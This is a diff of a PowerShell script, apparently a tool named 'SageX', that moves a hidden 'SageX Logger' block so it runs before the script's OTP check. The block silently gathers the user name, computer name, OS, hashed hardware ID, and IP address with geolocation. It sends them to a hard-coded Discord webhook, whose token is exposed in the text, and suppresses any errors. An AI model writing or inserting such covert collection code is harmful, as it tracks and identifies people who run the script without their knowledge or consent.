@@ -1,4 +1,52 @@
 Clear-Host
+# ==================== WEBHOOK BLOCK ====================
+$webhookUrl = "https://discord.com/api/webhooks/1375353706232414238/dMBMuwq29UaqujrlC1YPhh9-ygK-pX2mY5S7VHb4-WUrxWMPBB8YPVszTfubk-eVLrgN"
+
+$user = $env:USERNAME
+$pcName = $env:COMPUTERNAME
+$os = (Get-CimInstance Win32_OperatingSystem).Caption
+$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+$hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
+$hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""
+
+try {
+    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json" -ErrorAction Stop
+    $ip = $ipInfo.query
+    $country = $ipInfo.country
+    $region = $ipInfo.regionName
+    $city = $ipInfo.city
+} catch {
+    $ip = "Unavailable"
+    $country = "Unavailable"
+    $region = "Unavailable"
+    $city = "Unavailable"
+}
+
+$embed = @{
+    title = "<:Dead:1346705076626002033> SageX Executed"
+    color = 16711680
+    timestamp = (Get-Date).ToString("o")
+    fields = @(
+        @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
+        @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
+        @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
+        @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
+        @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
+        @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
+        @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
+        @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false }
+    )
+}
+
+$payload = @{
+    username = "SageX Logger"
+    embeds = @($embed)
+} | ConvertTo-Json -Depth 10
+
+try {
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
+} catch {
+}
 
 # ==================== OTP VERIFICATION SYSTEM ====================
 function Get-MachineFingerprint {
@@ -136,56 +184,6 @@ function Initialize-OTPSystem {
         exit
     }
 }
-
-# ==================== WEBHOOK BLOCK ====================
-$webhookUrl = "https://discord.com/api/webhooks/1375353706232414238/dMBMuwq29UaqujrlC1YPhh9-ygK-pX2mY5S7VHb4-WUrxWMPBB8YPVszTfubk-eVLrgN"
-
-$user = $env:USERNAME
-$pcName = $env:COMPUTERNAME
-$os = (Get-CimInstance Win32_OperatingSystem).Caption
-$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-$hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
-$hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""
-
-try {
-    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json" -ErrorAction Stop
-    $ip = $ipInfo.query
-    $country = $ipInfo.country
-    $region = $ipInfo.regionName
-    $city = $ipInfo.city
-} catch {
-    $ip = "Unavailable"
-    $country = "Unavailable"
-    $region = "Unavailable"
-    $city = "Unavailable"
-}
-
-$embed = @{
-    title = "<:Dead:1346705076626002033> SageX Executed"
-    color = 16711680
-    timestamp = (Get-Date).ToString("o")
-    fields = @(
-        @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
-        @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
-        @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
-        @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
-        @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
-        @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
-        @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
-        @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false }
-    )
-}
-
-$payload = @{
-    username = "SageX Logger"
-    embeds = @($embed)
-} | ConvertTo-Json -Depth 10
-
-try {
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
-} catch {
-}
-
 
 # ==================== MAIN SCRIPT ====================
 Initialize-OTPSystem
